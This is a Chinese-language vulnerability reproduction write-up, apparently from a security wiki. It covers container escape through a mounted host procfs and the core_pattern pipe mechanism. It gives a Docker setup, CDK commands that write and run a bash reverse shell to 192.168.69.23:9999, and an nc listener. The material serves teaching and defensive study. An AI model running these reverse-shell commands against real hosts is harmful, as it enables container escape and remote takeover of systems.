---
title: "挂载宿主机 procfs 系统导致容器逃逸"
date: 2026-10-19 09:17:40
categories:
  - WebSecurity
  - CVE
  - "云原生"
  - "挂载宿主机-procfs"
tags:
  - "挂载宿主机-procfs"
  - "漏洞复现"
---
## 漏洞描述

procfs 是一个伪文件系统，它动态反映着系统内进程及其他组件的状态，其中有许多十分敏感重要的文件。因此，将宿主机的 procfs 挂载到不受控的容器中也是十分危险的，尤其是在该容器内默认启用 root 权限，且没有开启 user namespace 时（Docker 默认情况下不会为容器开启 user namespace）。

一般来说，我们不会将宿主机的 procfs 挂载到容器中。然而，有些业务为了实现某些特殊需要，还是会将该文件系统挂载进来。

procfs 中的 `/proc/sys/kernel/core_pattern` 负责配置进程崩溃时内存转储数据的导出方式。从 [手册](http://man7.org/linux/man-pages/man5/core.5.html) 中我们能获得关于内存转储的详细信息，关键信息如下：

> 从 2.6.19 内核版本开始，Linux 支持在 `/proc/sys/kernel/core_pattern` 中使用新语法。如果该文件中的首个字符是管道符 `|`，那么该行的剩余内容将被当作用户空间程序或脚本解释并执行。

我们可以利用上述机制，在挂载了宿主机 procfs 的容器内实现逃逸。

参考链接：

- https://docs.docker.com/engine/security/userns-remap/
- http://man7.org/linux/man-pages/man5/core.5.html
- https://github.com/cdk-team/CDK

## 环境搭建

通过以下命令启动一个漏洞环境，下载 [cdk](https://github.com/cdk-team/CDK)，将其拷贝进容器：

```
docker run -v /root/cdk:/cdk -v /proc:/host_proc --rm -it ubuntu bash
```

宿主机的 procfs 在容器内部的挂载路径是 `/host-proc`。

## 漏洞复现

我们利用 cdk 写入反弹 shell 并执行：

```
./cdk run mount-procfs /host_proc 'echo "/bin/bash -i >& /dev/tcp/192.168.69.23/9999 0>&1" > /tmp/rev'
./cdk run mount-procfs /host_proc "chmod +x /tmp/rev"
./cdk run mount-procfs /host_proc "bash /tmp/rev"


# 或者直接执行：
# ./cdk run mount-procfs /host_proc "bash -c '/bin/bash -i >& /dev/tcp/192.168.69.23/9999 0>&1'"
```

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cloud/images/%E6%8C%82%E8%BD%BD%E5%AE%BF%E4%B8%BB%E6%9C%BA%20procfs%20%E7%B3%BB%E7%BB%9F%E5%AF%BC%E8%87%B4%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/image-20250520113929303.png)

成功接收：

```
nc -vvl 9999
```

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cloud/images/%E6%8C%82%E8%BD%BD%E5%AE%BF%E4%B8%BB%E6%9C%BA%20procfs%20%E7%B3%BB%E7%BB%9F%E5%AF%BC%E8%87%B4%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/image-20250520113952809.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/cloud/%E6%8C%82%E8%BD%BD%E5%AE%BF%E4%B8%BB%E6%9C%BA-procfs-%E7%B3%BB%E7%BB%9F%E5%AF%BC%E8%87%B4%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8.md)
